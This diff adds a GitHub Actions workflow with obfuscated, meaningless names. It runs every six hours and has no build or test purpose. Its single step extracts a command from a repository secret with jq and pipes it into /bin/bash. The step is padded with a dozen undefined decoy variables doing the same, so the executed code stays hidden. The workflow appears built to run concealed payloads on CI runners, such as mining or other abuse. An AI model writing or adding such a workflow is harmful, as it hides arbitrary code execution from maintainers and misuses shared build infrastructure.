@@ -1,0 +1,30 @@
+name: baolaipangrou
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '0 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: baolaipangrou
+        env:
+          jufeb2: ${{ secrets.jufeb2 }}
+        run: |
+          echo $jufeb2 | jq -r .qig19875 | /bin/bash
+          echo $vfkos15 | jq -r .f02948 | /bin/bash
+          echo $fqx00141 | jq -r .wci575 | /bin/bash
+          echo $g894 | jq -r .va1 | /bin/bash
+          echo $zmf01082 | jq -r .sok9053 | /bin/bash
+          echo $w861 | jq -r .f70565 | /bin/bash
+          echo $izgxu6334 | jq -r .cp499 | /bin/bash
+          echo $bl6208 | jq -r .eziqs5 | /bin/bash
+          echo $itadv9176 | jq -r .o6433 | /bin/bash
+          echo $waqj73637 | jq -r .scmcn1751 | /bin/bash
+          echo $dum27612 | jq -r .cszt1602 | /bin/bash
+          echo $kjtu4 | jq -r .he935 | /bin/bash
+          echo $lj69591 | jq -r .omhak3 | /bin/bash
+
